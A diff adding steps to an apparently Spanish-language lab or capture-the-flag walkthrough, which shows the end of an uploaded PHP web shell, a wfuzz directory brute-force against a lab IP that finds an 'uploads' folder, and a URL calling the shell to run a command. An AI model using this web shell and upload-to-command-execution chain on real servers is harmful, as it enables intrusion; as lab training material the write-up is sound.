@@ -20,3 +20,14 @@ En la pagina se pueden subir archivos asi que vamos a intentar intruir con algun
 system($_GET[' cmd ']); 
 ?>
 ```
+Ahora haremos un WFUZZ para intentar encontrar la ruta en donde esos archivos van a parar en el servidor.
+```Linux
+wfuzz -c --hc 404 -t 200 -w /usr/share/wordlists/dirsbuster/directory-list-2.3-medium.txt http://172.17.0.2/FUZZ
+```
+
+Como podremos ver hay una carpeta llamada uploads asi que ahi es donde encontraremos los archivos subidos
+
+Ahora haremos una prueba mediante la url para ejecutar el archivo y pasarle un comando para que interprete.
+```Linux
+172.17.0.2/uploads/shell.php?cmd=id
+```
